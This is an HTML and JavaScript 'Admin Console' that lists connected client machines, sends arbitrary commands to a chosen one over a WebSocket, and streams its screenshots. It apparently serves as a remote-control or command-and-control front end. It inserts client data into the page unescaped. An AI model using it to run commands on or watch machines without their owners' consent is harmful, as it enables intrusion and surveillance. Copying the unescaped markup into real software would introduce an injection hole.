<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Console</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    pre { background: #eee; padding: 10px; max-height: 300px; overflow: auto; }
    img { max-width: 100%; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <h1>Admin Console</h1>

  <h2>Clients:</h2>
  <ul id="client-list"></ul>

  <h3 id="client-info"></h3>

  <h2>Send Command:</h2>
  <input type="text" id="command-input">
  <button onclick="sendCommand()">Send</button>

  <h2>Screen:</h2>
  <button onclick="startScreen()">Start Screenshare</button>
  <button onclick="stopScreen()">Stop Screenshare</button>
  <div><img id="screen" /></div>

  <h2>Output:</h2>
  <pre id="output"></pre>

  <script>
    let selectedClient = null;
    let ws = null;
    let clientsData = [];

    function apiBase() {
      return window.location.origin;
    }

    function wsBase() {
      return (window.location.protocol === "https:" ? "wss://" : "ws://") + window.location.host;
    }

    function loadClients() {
      fetch(apiBase() + "/clients")
        .then(res => res.json())
        .then(data => {
          clientsData = data.clients;
          const list = document.getElementById("client-list");
          list.innerHTML = "";
          data.clients.forEach(c => {
            const li = document.createElement("li");
            li.innerHTML = `${c.id} (${c.status}) <button onclick="selectClient('${c.id}')">Select</button>`;
            list.appendChild(li);
          });
        });
    }

    function selectClient(clientId) {
      selectedClient = clientId;
      const info = clientsData.find(c => c.id === clientId);
      let infoHtml = "";
      if (info && info.info) {
        for (const [key, value] of Object.entries(info.info)) {
          infoHtml += `${key}: ${value}<br>`;
        }
      }
      document.getElementById("client-info").innerHTML = infoHtml;
      document.getElementById("output").textContent = "";
      document.getElementById("screen").src = "";
    }

    function initWS() {
      ws = new WebSocket(wsBase() + "/ws/admin");
      ws.onmessage = (e) => {
        if (typeof e.data === "string") {
          document.getElementById("output").textContent += e.data + "\n";
        } else {
          const url = URL.createObjectURL(new Blob([e.data]));
          document.getElementById("screen").src = url;
        }
      };
    }

    function sendCommand() {
      const input = document.getElementById("command-input").value;
      if (selectedClient && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ target: selectedClient, cmd: input }));
      }
    }

    function startScreen() {
      if (selectedClient && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_start" }));
      }
    }

    function stopScreen() {
      if (selectedClient && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_stop" }));
      }
    }

    loadClients();
    setInterval(loadClients, 5000);
    initWS();
  </script>
</body>
</html>
